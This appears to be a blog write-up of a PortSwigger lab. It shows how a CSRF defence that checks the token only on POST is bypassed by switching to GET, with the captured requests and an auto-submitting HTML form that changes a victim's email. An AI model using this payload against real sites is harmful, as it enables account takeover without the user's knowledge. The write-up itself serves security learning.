---
layout: post
title: "CSRF where token validation depends on the request method"
date: 2026-10-11
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method){:target="_blank"}'s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

## Steps

Intercepting the request:

```http
POST /my-account/change-email HTTP/1.1
Host: 0a8600f804a6870981bddec7000200a0.web-security-academy.net
Cookie: session=syUQpyX3qjeEntvw7Wc3xqX5zeX3Ogt3
Content-Length: 63
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a8600f804a6870981bddec7000200a0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8600f804a6870981bddec7000200a0.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive

email=jawad%40example.com&csrf=qQvkRVAghpDGAMakRGSaOP0d1PLF8e3t
```

Removing `csrf=qQvkRVAghpDGAMakRGSaOP0d1PLF8e3t` returns a `400 Bad Request`:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 26

"Missing parameter 'csrf'"
```

However, changing the HTTP request method to `GET` instead of `POST` and then removing the `csrf` parameter bypasses the protection:

```http
GET /my-account/change-email?email=jawad2%40example.com HTTP/2
Host: 0a8600f804a6870981bddec7000200a0.web-security-academy.net
Cookie: session=syUQpyX3qjeEntvw7Wc3xqX5zeX3Ogt3
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0a8600f804a6870981bddec7000200a0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a8600f804a6870981bddec7000200a0.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive
```

We create our HTML form and expose it to the end user. When it is submitted, the CSRF vulnerability is exploited:

```html
<h1>Lab02</h1>

<form method="GET" action="https://0a8600f804a6870981bddec7000200a0.web-security-academy.net/my-account/change-email?email=jawad4@example.com">
  <input type="hidden" name="email" value="jawad5@example.com">
</form>

<script> document.forms[0].submit(); </script>
```
